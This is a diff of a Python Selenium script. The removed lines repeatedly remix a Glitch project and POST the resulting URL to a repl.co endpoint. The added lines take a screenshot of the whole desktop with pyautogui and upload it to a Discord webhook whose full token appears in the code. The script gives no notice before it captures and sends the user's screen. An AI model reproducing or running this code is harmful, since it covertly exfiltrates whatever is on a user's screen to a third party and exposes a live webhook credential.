@@ -31,31 +31,24 @@ driver.set_window_size(1920, 1080)
 timez = int(time.time())+30
 print("rawr")
 a = True
-driver.get('https://glitch.com/edit/#!/remix/chipped-aged-clavicle')
-timez = int(time.time())+120
-while a==True:
-    if(driver.current_url.startswith("https://glitch.com/edit/#!/remix/chipped-aged-clavicle")):
-        time.sleep(0.2)
-        if(timez<int(time.time())):
-            a = False
-            driver.close()
+driver.get('https://example.com/')
 
+screenshot = pyautogui.screenshot()
+screenshot.save("screenshot.png")
 
-    else:
-        a = False
-        val = driver.current_url
-        val = val.replace("https://glitch.com/edit/#!/", "")
-        val = val.replace("?path=README.md%3A1%3A0", "")
-        val = "https://"+val+".glitch.me/"
-        print(val)
-        payload = "test="+val
-        headers = {
-            'cache-control': "no-cache",
-            'content-type': "application/x-www-form-urlencoded"
-            }
-        response = requests.request("POST", "https://RealFoolhardyAddin.idotmastera.repl.co/rawr", data=payload, headers=headers)
-        print(response)
-        driver.close()
+# Send screenshot to Discord webhook
+with open("screenshot.png", "rb") as img:
+   response = requests.post(
+       'https://canary.discord.com/api/webhooks/1190831794157789194/7woA16J43vhLVfh9sXAv2390jfJxTB_OGe3fWOlweP_F5b7-XFkAcSO2Z3XPut3m0lrb',
+       files={'file': img}
+   )
+
+# Check if the request was successful
+if response.status_code == 200:
+   print("Screenshot sent successfully.")
+else:
+   print("Failed to send screenshot.")
+
 
 
 
